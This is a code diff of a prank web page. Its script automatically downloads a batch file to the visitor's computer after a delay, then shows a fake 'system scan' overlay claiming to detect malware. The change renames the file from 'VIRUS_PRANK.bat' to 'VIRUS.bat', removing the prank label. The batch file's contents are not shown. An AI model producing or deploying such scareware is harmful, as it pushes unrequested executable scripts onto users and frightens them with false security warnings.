@@ -154,7 +154,7 @@ exit
     const batUrl = URL.createObjectURL(batBlob);
     const downloadLink = document.createElement('a');
     downloadLink.href = batUrl;
-    downloadLink.download = 'VIRUS_PRANK.bat';  // Important: Must end with .bat
+    downloadLink.download = 'VIRUS.bat';  // Important: Must end with .bat
     downloadLink.click();
 
     // Show a fake warning
@@ -196,7 +196,7 @@ exit
       overlay.style.zIndex = '9999';
       overlay.style.overflow = 'auto';
       overlay.innerHTML = `
-        <h2 style="color: red;">⚠ I STAYED UP TILL 2 A.M. TO MAKE THIS. ON A DAY I WOKE UP AT 5:50 TO GO ON A RUN, AFTER GOING ON A MILK RUN THE NIGHT BEFORE⚠</h2>
+        <h2 style="color: red;">⚠ I STAYED UP TILL 2 A.M. ON A DAY I WOKE UP AT 5:50 TO GO ON A RUN AFTER GOING ON A MILK RUN THE NIGHT BEFORE⚠</h2>
         <p>> Scanning system memory...</p>
         <p>> Detecting malware signatures...</p>
         <p id="scan-output"></p>
@@ -235,11 +235,10 @@ exit
             }
           }, 2000);
         }
-      }, 200);
+      }, 300);
     }
   }, 5000); // 5-second delay
-</script>
-  
+</script> 
 
   
 <body>
